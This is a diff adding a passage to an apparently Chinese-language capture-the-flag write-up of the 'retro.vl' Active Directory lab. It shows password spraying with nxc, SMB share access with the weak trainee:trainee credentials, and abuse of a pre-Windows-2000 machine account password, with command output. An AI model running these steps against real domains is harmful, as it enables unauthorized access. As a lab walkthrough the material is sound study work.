@@ -190,4 +190,51 @@ jburley
 tblack
 ```
 #### \K：丢弃前面的内容   [^ ]+ 重新开始   \s+ 空格
+
 ```
+[★]$ nxc smb retro.vl -u users.txt -p users.txt --continue-on-success
+<SNIP>
+SMB         10.129.50.94    445    DC               [+] retro.vl\trainee:trainee
+<SNIP>
+```
+#### 找到学员帐户的弱密码。密码确实与用户名相同。使用标识凭据后，可以枚举Notes共享
+```
+[★]$ smbclient //retro.vl/Notes -U 'trainee%trainee'
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Apr  8 22:12:49 2025
+  ..                                DHS        0  Wed Jun 11 09:17:10 2025
+  ToDo.txt                            A      248  Sun Jul 23 17:05:56 2023
+  user.txt                            A       32  Tue Apr  8 22:13:01 2025
+
+		4659711 blocks of size 4096. 1308083 blocks available
+smb: \> get ToDo.txt
+getting file \ToDo.txt of size 248 as ToDo.txt (5.8 KiloBytes/sec) (average 5.8 KiloBytes/sec)
+smb: \> get user.txt
+getting file \user.txt of size 32 as user.txt (0.7 KiloBytes/sec) (average 3.2 KiloBytes/sec)
+smb: \> exit
+[★]$ cat user.txt
+```
+### Privilege Escalation
+```
+[★]$ cat ToDo.txt
+Thomas,
+
+after convincing the finance department to get rid of their ancienct banking software
+it is finally time to clean up the mess they made. We should start with the pre created
+computer account. That one is older than me.
+在说服财务部门去掉他们的旧银行软件之后
+现在终于到了收拾烂摊子的时候了。我们应该从预先创建的开始
+计算机帐户。那个比我还大。
+
+Best
+
+James
+詹姆斯
+```
+#### 正如ToDo.txt所提到的，来自财务部门的旧的预先创建的机器帐户是我们从RID暴力破解中找到的BANKING$帐户。在创建计算机帐户时，如果将此计算机帐户分配为windows 2000以前的计算机则将密码设置为帐户名称本身，但使用小写字母。如果机器帐户没有尚未对域进行身份验证，可以更改其密码。让我们首先验证banking是否确实是banking $机器帐户的密码
+```
+[★]$ smbclient //retro.vl/Notes -U 'BANKING$%banking'
+session setup failed: NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
+```
+#### 因为我们得到NT状态NOLOGON工作站信任帐户，而不是NT状态登录失败机器账户，看起来是这样的。现在，应该更改密码以成功进行身份验证。对于这个更改，passpasswd.py from可以使用Impacket。
